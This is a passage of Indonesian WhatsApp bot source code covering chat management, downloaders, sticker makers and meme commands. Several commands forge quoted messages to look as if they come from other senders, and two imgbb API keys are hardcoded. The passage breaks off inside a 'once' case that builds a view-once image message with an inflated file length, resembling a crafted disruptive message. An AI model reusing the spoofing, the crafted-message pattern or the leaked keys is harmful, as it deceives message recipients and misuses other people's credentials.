          buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
          buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
          prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{})
          hexa.relayWAMessage(prep)
break
         
         case 'clearall':
                  if (!mek.key.fromMe) return reply('Khusus Owner')
                  anu = await hexa.chats.all()
                  hexa.setMaxListeners(25)
                  for (let _ of anu) {
                  hexa.deleteChat(_.jid)
                  }
                  reply('Sukses delete all chat :)')
        break
        
        case 'readallchat':  case 'readall':  case 'rall':
                  if (!mek.key.fromMe) return reply('Khusus Owner')
                  reply(`Succes Membaca ${totalchat.length} Chat`)
                  const readallid = await hexa.chats.all()
                  hexa.setMaxListeners(25)
                  for (let xyz of readallid) {
                  await hexa.chatRead(xyz.jid)
                  }
                  hexa.sendMessage(from, `Sukses!`, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "Berhasil membaca semua chat!", 'jpegThumbnail': fs.readFileSync('./stik/fake.jpg')}}}})
         break
         
         case 'blockk':
					if (!isGroup) return reply('GROUP ONLY')
					hexa.blockUser (`${body.slice(8)}@c.us`, "add")
					hexa.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
		  break
					
        case 'unblockk':
					if (!isGroup) return reply('GROUP ONLY')
				    hexa.blockUser (`${body.slice(10)}@c.us`, "remove")
					hexa.sendMessage(from, `*Perintah Diterima, Membuka Blockir* ${body.slice(9)}@c.us`, text)
       break

   case 'notif':					
            if (!isGroup) return reply(mess.group)
            teks = `Notif dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
            group = await hexa.groupMetadata(from);
            member = group['participants']
            jids = [];
            member.map(async adm => {
            jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
            })
            options = {
            text: teks,
            contextInfo: {
            mentionedJid: jids
            },
            quoted: FajarGanz
            }
            await hexa.sendMessage(from, options, text)
            break

case 'unpin':
            if (!mek.key.fromMe) return reply('*Ente owner?_*')
             hexa.modifyChat(from, ChatModification.unpin)
             reply('*succes unpin this chat*')
              console.log('unpin chat = ' + from)
      break
      
        case 'pin':
              if (!mek.key.fromMe) return reply('*Ente owner?_*')
               hexa.modifyChat(from, ChatModification.pin)
               reply('*succes pin this chat*')
              console.log('pinned chat = ' + from)
       break
       
         case 'unreadall':
                     if (!mek.key.fromMe) return reply('*Ente owner?_*')
                       var chats = await hexa.chats.all()
                       chats.map( async ({ jid }) => {
                      await hexa.chatRead(jid, 'unread')
                          })
		                reply(`\`\`\`Successfully unread ${chats.length} chats !\`\`\``)
		               console.log(chats.length)
	          break
	
	case 'unarchiveall':
              if (!mek.key.fromMe) return reply('*Ente owner?_*')
             reply('*succes unarchive all chat*')
             console.log('succes unarchive chat = ' + from)
             anu = await hexa.chats.all()
             for (let _ of anu) {
             hexa.modifyChat(_.jid, ChatModification.unarchive)
                 }
       break 
             
            case 'archive':
                      if (!mek.key.fromMe) return reply('*Ente owner?_*')
                       reply(mess.wait)
                       console.log('succes archive chat = ' + from)
                      await sleep(3000)
                      hexa.modifyChat(from, ChatModification.archive)
           break
           
           case 'delthischat':
                     if (!mek.key.fromMe) return reply('*Ente owner?_*')
                      console.log('succes delete chat = ' + from)
                       await sleep(4000)
                       await hexa.modifyChat(from, ChatModification.delete)
                         reply('*succes delete this chat*')
                break
                
      case 'grup':
      case 'grub':
      case 'groub':
      case 'group':
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins) return reply(mess.only.admin)
  if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
  if (args[0] === "buka") {
  hexa.groupSettingChange(from, GroupSettingChange.messageSend, false)
  } else if (args[0] === "tutup") {
  hexa.groupSettingChange(from, GroupSettingChange.messageSend, true)
  } else {
  const buttons = [{buttonId: `${prefix}grup buka`, buttonText: {displayText: 'BUKA'}, type: 1},{buttonId: `${prefix}grup tutup`, buttonText: {displayText: 'TUTUP'}, type: 1}]
  const buttonMessage = {
  headerType: "IMAGE",
  contentText: `GROUP SETTING`,
  footerText: `Pilih Di Bawah 👇`,
  buttons: buttons,
  headerType: 1
  }
  hexa.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek})
  }
  break 
        
      
            case 'autosticker':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (args[0] === '1') {
					if (isAutoSticker) return reply('*Fitur level sudah aktif sebelum nya*')
					autosticker.push(from)
					fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
					reply(ind.lvlon())
					} else if (args[0] === '0') {
					autosticker.splice(from, 1)
						fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
						reply(ind.lvloff())
					} else {
						reply(ind.satukos())
					}
					break
        
        case 'naruto':
if (!q) return reply('teksnya mana?')
        pNaruto(`${q}`)
         .then(res => {
    	console.log(res) 
        sendMediaURL(from, res.url)
		})
		break
		
case 'shadow':
if (!q) return reply('teksnya mana?')
        pShadow(`${q}`)
         .then(res => {
    	console.log(res) 
        sendMediaURL(from, res.url)
		})
break
		
case 'romantic':
if (!q) return reply('teksnya mana?')
        pRomantic(`${q}`)
         .then(res => {
    	console.log(res) 
        sendMediaURL(from, res.url)
		})
		break
		
case 'smoke':
if (!q) return reply('teksnya mana?')
       pSmoke(`${q}`)
         .then(res => {
    	console.log(res) 
        sendMediaURL(from, res.url)
		})
		break
		
case 'burnpaper':
if (!q) return reply('teksnya mana?')
        pBurnPapper(`${q}`)
         .then(res => {
    	console.log(res) 
        sendMediaURL(from, res.url)
		})
		break
		
case 'lovemsg':
if (!q) return reply('teksnya mana?')
        pLoveMsg(`${q}`)
         .then(res => {
    	console.log(res) 
        sendMediaURL(from, res.url)
		})
		break
		
case 'grass':
if (!q) return reply('teksnya mana?')
        pMsgGrass(`${q}`)
         .then(res => {
    	console.log(res) 
        sendMediaURL(from, res.url)
		})
		break
		
case 'doubleheart':
if (!q) return reply('teksnya mana?')
         pDoubleHeart(`${q}`)
         .then(res => {
    	console.log(res) 
       sendMediaURL(from, res.url)
		})
		break
		
case 'coffecup':
if (!q) return reply('teksnya mana?')
       pCoffeCup(`${q}`)
         .then(res => {
    	console.log(res) 
       sendMediaURL(from, res.url)
		})
		break
		
case 'lovetext':
if (!q) return reply('teksnya mana?')
       pLoveText(`${q}`)
         .then(res => {
    	console.log(res) 
       sendMediaURL(from, res.url)
		})
		break
		
case 'butterfly':
if (!q) return reply('teksnya mana?')
        pButterfly(`${q}`)
         .then(res => {
    	console.log(res) 
         sendMediaURL(from, res.url)
		})
		break
		
  case 'wanted':
  if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
           reply(mess.wait)
           reply(mess.lim)
           txt2 = args[1]
           txt3 = args[2]
           anu = await getBuffer(`https://dhnjing.xyz/maker/photooxy/one-piece/wanted?bgUrl=https://i.ibb.co/pxdL8Rz/favicon.png&textTop=$txt2}&textBottom=${txt3}`)
           hexa.sendMessage(from, anu, image, {quoted: mek})
           break
           
        case 'gta':  
        if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*BEGRON NYA MANA KAK contoh ${prefix}${command} https://i.ibb.co/pxdL8Rz/favicon.png *`)
                   reply(mess.wait) 
                   reply(mess.lim)
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://dhnjing.xyz/maker/photooxy/grand-theft-auto?bgUrl=${F}`)
                   hexa.sendMessage(from, anu, image, {caption: `OK it's done\n\n`, quoted: mek})
   break
   
case 'dota':
if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
            reply(mess.wait)
            reply(mess.lim)
           txt1 = args.join(" ")
let andomChar = Math.floor(Math.random() * 5) + 1
          hehe = await getBuffer(`https://dhnjing.xyz/maker/photooxy/dota?character=${andomChar}&text=${txt1}`)
           hexa.sendMessage(from, hehe, image, {quoted: mek})
break

case 'pokemon':
if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
            reply(mess.wait)
            reply(mess.lim)
           txt1 = args.join(" ")
let ndomChar = Math.floor(Math.random() * 5) + 1
hehe = await getBuffer(`https://dhnjing.xyz/maker/photooxy/pokemon/text?character=${ndomChar}&text=${txt1}`)
           hexa.sendMessage(from, hehe, image, {quoted: mek})
break

 case 'aov':
 if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
            reply(mess.wait)
            reply(mess.lim)
           txt1 = args.join(" ")
let randomChar = Math.floor(Math.random() * 95) + 1
let randomBorder = Math.floor(Math.random() * 5) + 1
          pahexa = await getBuffer(`https://dhnjing.xyz/maker/photooxy/arena-of-valor?character=${randomChar}&border=${randomBorder}&text=${txt1}`)
           hexa.sendMessage(from, pahexa, image, {quoted: mek})
break
	
	    case 'play': case 'ytdl':
	           if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
                  reply(mess.wait)
                  reply(mess.lim)
                  if (!q) return reply(`Example : ${prefix + command} dj tutu 30 detik`)
                  res = await yts(q).catch(e => {
                  reply('_[ ! ] Error Yang Anda Masukan Tidak Ada_')
              })
                  let thumbInfo = `*Youtube Play▶️*
               
📜 Judul : ${res.all[0].title}
📬 ID : ${res.all[0].videoId}
🌐 Publikasi : ${res.all[0].ago}
🎞️ Ditonton : ${res.all[0].views}
⚖️ Durasi : ${res.all[0].timestamp}
🎥 Channel : ${res.all[0].author.name}
🖇️ Link : ${res.all[0].author.url}`

                  buttons = [{buttonId:`${prefix}buttonvideo ${res.all[0].url}`,buttonText:{displayText:'🎥VIDEO'},type:1},{buttonId:`${prefix}buttonmusic ${res.all[0].url}`,buttonText:{displayText:'🎵AUDIO'},type:1}]
                  imageMessage = (await hexa.prepareMessageMedia({url:res.all[0].image},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage
                  buttonsMessage = {contentText: thumbInfo,footerText:'Silahkan Pilih Jenis File Dibawah Ini',imageMessage,buttons,headerType:4}
                  inijar = await hexa.prepareMessageFromContent(from,{buttonsMessage},{})
                  hexa.relayWAMessage(inijar)
       break

       case 'buttonmusic':
                  if(!q) return reply('linknya?')
                  reply(mess.wait)
                  reply(mess.lim)
                  res = await yta(`${q}`).catch(e => {
                  reply('_[ ! ] Error Saat Mengirim Audio_')
               })
                  filesize = res
                  if (Number(filesize) >= 100000) return reply('File Melebihi Dari 100 MB!')
                  sendMediaURL(from, `${res.dl_link}`)
         break
         
         case 'buttonvideo':
                  if(!q) return reply('linknya?')
                  reply(mess.wait)
                  reply(mess.lim)
                  res = await ytv(`${q}`).catch(e => {
                  reply('_[ ! ] Error Saat Mengirim Video_')
            })
                 filesize = res
                 if (Number(filesize) >= 100000) return reply('File Melebihi Dari 100 MB!')
                  sendMediaURL(from, `${res.dl_link}`,'nih kak')
          break
          
       case 'ttnowm': 
             if (!q) return reply('Linknya?')
             if (!q.includes('tiktok')) return reply(mess.error.Iv)
             reply(mess.wait)
             reply(mess.lim)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.nowatermark) })
            .catch((err) => { reply(String(err)) })
     break   

     case "tiktok":
     if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
        if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${args[0]}`
        );
        var b = bv.result.author_metadata;
        var tamnel = await getBuffer(
          bv.result.media_resources.image.contentUrl
        );
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `⚜️ *Nickname*: ${b.username}\n❤️ *Like*: ${a.stats.diggCount}\n💬 *Komentar*: ${a.stats.commentCount}\n🔁 *Share*: ${a.stats.shareCount}\n🎞️ *Views*: ${a.stats.playCount}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|audio`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        break
        
        case "tiktokdl":
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${link}`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result.media_resources.music.playUrl, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.video.videoUrl, "");
        }
        break
       
   case 'ttmp4':
        if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
       if (args.length < 1) return reply('Link?')
       lin = args[0]
      freply(mess.wait)
      reply(mess.lim)
      hx.ttdownloader(lin).then(res => {
      console.log('[ TIKTOK ] downloader')
      anu = res.nowm
      fto = fs.readFileSync(`stik/thumb.jpeg`)
      hexa.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP4*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
       sendMediaURL(from, anu, 'Done!')
})
break

case 'ttmp3':
          if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
         if (args.length < 1) return reply('Link?')
         lin = args[0]
        freply(mess.wait)
        reply(mess.lim)
        hx.ttdownloader(lin).then(async (res) => {
        console.log('[ TIKTOK ] downloader')
        anu = res.nowm
        fto = fs.readFileSync(`stik/thumb.jpeg`)
        hexa.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP3*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
        khs = await getBuffer(anu)
        hexa.sendMessage(from, khs, audio, {quoted:mek, mimetype:'audio/mp3', filename:'hexagans.mp3', ptt:true})
        })
break

case 'ytmp3':
	if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				reply(mess.lim)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam fajartuk link_`)
				const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
          
    case 'dadu':
    if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			ranp = getRandom('.png')
			rano = getRandom('.webp')
		        random = `${Math.floor(Math.random() * 6)}`
                    hasil = 'https://www.random.org/dice/dice' + random + '.png'
			exec(`wget ${hasil} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			fs.unlinkSync(ranp)
			if (err) return reply(mess.error.api)
			buffer = fs.readFileSync(rano)
			hexa.sendMessage(from, buffer, sticker, {quoted: mek})
			fs.unlinkSync(rano)
			})
break

case 'hash':
if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
         try {
         if (!isQuotedSticker) return reply('Reply Sticker!')
         const encmeds = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
         const mediastick = await hexa.downloadMediaMessage(encmeds)
         var crypto = require('crypto')
          hash = crypto.createHash('sha256').update(mediastick).digest('base64');
           console.log(hash)
           reply (hash)
          } catch {
            reply(`reply stiker dengan command ${prefix}hash`)
          }
 break

case 'amongus': case 'amongsus': case 'amogus':
if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
                   reply(mess.wait)
                   fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/Among')
                  .then(res => res.text())
                  .then(body => {
                   let tod = body.split("\n");
                   let pjr = tod[Math.floor(Math.random() * tod.length)];
                 sendStickerFromUrl(from, pjr)
              }
         )
break

case 'paimon':
if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
             reply(mess.wait)
             fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/Paimon')
             .then(res => res.text())
             .then(body => {
             let tod = body.split("\n");
             let pjr = tod[Math.floor(Math.random() * tod.length)];
            sendStickerFromUrl(from, pjr)
          }
       )
break

case 'bucin':
if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
           reply(mess.wait)
           fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
           .then(res => res.text())
           .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            sendStickerFromUrl(from, pjr)
          }
        )
break

case 'bengong': case 'gktausiapa': case 'gtausiapa': case 'gatausiapa':
if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
              reply(mess.wait)
             fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gatau siapa')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
            sendStickerFromUrl(from, pjr)
           }
        )
break

case 'mukelu': case 'mukalu':
if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
             reply(mess.wait)
             fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/mukelu')
             .then(res => res.text())
             .then(body => {
             let tod = body.split("\n");
             let pjr = tod[Math.floor(Math.random() * tod.length)];
            sendStickerFromUrl(from, pjr)
           }
        )
break

case 'doge':
if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
            }
        )
break
              
case 'patrick':     
if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
           }
       )
break
              
case 'gura': case 'gawrgura':     
if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
           }
       )
break
              
case 'animestick': case 'stickeranime':     
if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!') 
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
             .then(res => res.text())
             .then(body => {
              let todd = body.split("\n");
              let pjrr = todd[Math.floor(Math.random() * todd.length)];
              sendWebp(from, pjrr)
            }
         )
break

case 'smeme': case 'stickmeme':
                  top = arg.split('|')[0]
                  bottom = arg.split('|')[1]
                  var imgbb = require('imgbb-uploader')
                  if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
                  ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
                  owgi = await  hexa.downloadAndSaveMediaMessage(ger)
                  anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
                  teks = `${anu.display_url}`
                  ranp = getRandom('.gif')
                  rano = getRandom('.webp')
                  anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
                  sendStickerFromUrl(from, `${anu1}`)
                  } else {
                  reply('Gunakan foto/stiker!')
                  }
                  break   

         case 'attp':  
         if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    reply(mess.wait)
                    reply(mess.lim)
                    if (args.length < 1) return reply('Kasih teks lah omm')
                    F = body.slice(6)
                    anu1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${F}`)
                    hexa.sendMessage(from, anu1, sticker, {quoted: mek})
                    break

    case 'meme': case 'darkjokes': case 'cowok': case 'cewek':
    if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
reply(mess.lim)
				 data = fs.readFileSync(`./fajar/${command}.js`);
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex]; 
                 fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(randKey.result))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}menu`,buttonText:{displayText:'BALIK KE MENU'},type:1}]
              imageMsg = ( await hexa.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{quoted: FajarGanz})
              hexa.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
break
    
    case 'katabijak':  case 'pantun':  case 'fakta':    
if (!isRegistered) return reply( ind.noregis())
if (isLimit(sender)) return reply(ind.limitend(pushname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')            
reply(mess.lim)
                    get_result = await fetchJson(`https://dhnjing.xyz/random/${command}/v1`)
          reply(get_result.result)
  break
  
  case 'asupan':{
  reply(mess.wait)
  data = fs.readFileSync('./fajar/asupan.js');
  jsonData = JSON.parse(data);
  randIndex = Math.floor(Math.random() * jsonData.length);
  randKey = jsonData[randIndex];
  p = await getBuffer(randKey.result)
  hexa.sendMessage(from, p, video, { quoted:  mek, mimetype: 'video/mp4', caption: '𝙉𝙄𝙃 𝘼𝙎𝙐𝙋𝘼𝙉'})
  }
  break
  
  case 'tourl':
  case 'imagetorul':
  case 'imgtourl':
  case 'audiotourl':
  case 'videotourl':
  case 'stickertourl':
  case 'stikertourl':
  case 'tolink':
  var imgbb = require('imgbb-uploader')
  if (isQuotedAudio) {
  ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  reply(mess.wait)
  owgi = await hexa.downloadAndSaveMediaMessage(ger)
  Okelor = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
  teks=`─ 「 *AUDIO TO URL* 」 ─

*${f}Url : ${Okelor.display_url}*`
  reply(teks)
 
  } else if (isQuotedImage) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
  reply(mess.wait)
  owgi = await hexa.downloadAndSaveMediaMessage(ger)
  qbc = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
teks=`─ 「 *IMAGE TO URL* 」 ─

*${f}Url : ${qbc.display_url}*`
  reply(teks)
  } else if (isQuotedVideo) {
  ger = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
  reply(mess.wait)
  owgi = await hexa.downloadAndSaveMediaMessage(ger)
  ffff = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
  teks=`─ 「 *VIDEO TO URL* 」 ─

*${f}Url : ${ffff.display_url}*`
  reply(teks)
  } else if (isQuotedSticker) {
  ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  reply(mess.wait)
  owgi = await hexa.downloadAndSaveMediaMessage(ger)
  vrr = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
  teks=`─ 「 *STICKER TO URL* 」 ─

*${f}Url : ${vrr.display_url}*`
  reply(teks)
  }
  break
 
    case 'jadibot':
    if (!isPremium) return reply('FITUR INI KHUSUS MEM PREMI')
    if(mek.key.fromMe) return reply('Tidak bisa jadibot di dalam bot')
    jadibot(reply,hexa,from)
    break
    
    case 'stopjadibot':
    if (!isPremium) return reply('FITUR INI KHUSUS MEM PREMI')
    if(mek.key.fromMe)return reply('tidak bisa stopjadibot kecuali owner')
    stopjadibot(reply)
    break
    
    case 'listbot':
    let tekss = '「 *LIST JADIBOT* 」\n'
    for(let i of listjadibot) {
    tekss += `*Nomor* : ${i.jid.split('@')[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
    }
    reply(tekss)
    break
    
    case 'menuowner': 
    if (!mek.key.fromMe) return reply('*MAOO NAGPAIN HAYIOOO*')
	run = process.uptime() 
    teks = `${kyun(run)}`
    try {
pic = await hexa.getProfilePicture(sender)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
gambar = await getBuffer(pic)
    mhan = await hexa.prepareMessage(from, gambar, image, {thumbnail: gambar, quoted: FajarGanz, contextInfo:{"forwardingScore":999,"isForwarded":true, "mentionedJid": [SadGril],"externalAdReply": {"title": `Hai Kak ${pushname}👋🏻`, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg","previewType": "VIDEO","mediaUrl": `https://youtu.be/pJU6Rr3SQ4g`}}})
    button = [
  {buttonId: `${prefix}owner`, buttonText: {displayText: '👤 CONTACT OWNER'}, type: 1},
  {buttonId: `{prefix}menua`, buttonText: {displayText: '📒 MENU BOT'}, type: 1},
  {buttonId: 'REST API', buttonText: {displayText: 'REST API'}, type: 1}
]
 buttons = {
imageMessage: mhan.message.imageMessage,
    contentText: help.menu(pushname, sender, prefix, banChats, offline, ucapanWaktu, wib, wita, wit, prema, latensii, totalgrouppp, totalkontakkk, totalchattt, SadGril),
    footerText: `ꪶ𖣂ꫂFajarGanzꪶ𖣂ꫂ`,
    buttons: button,
    headerType: 4
}
await hexa.sendMessage(from, buttons, MessageType.buttonsMessage, {
        jpegThumbnail: fs.readFileSync('./stik/fake.jpeg'),
        caption: help.menu(pushname, sender, prefix, banChats, offline, ucapanWaktu, wib, wita, wit, prema, latensii, totalgrouppp, totalkontakkk, totalchattt, SadGril),
            mentionedJid: [sender]},
            {quoted: FajarGanz})
           	break
           
     case 'once':
res = await hexa.prepareMessageFromContent(from,{
					"viewOnceMessage": {
						"message": {
							"imageMessage": {
								"url": "https://mmg.whatsapp.net/d/f/AkDDJ2975Us3dWKRidt-fQcaa_xhkyQmpMHTJosKhlra.enc",
								"mimetype": "image/jpeg",
								"fileSha256": "wgXag8O9U0ncVltenjKQxgaHM+7/LnagjSGy41FZ1eA=",
								"fileLength": "99999999999",
								"height": 1080,
								"width": 1079,
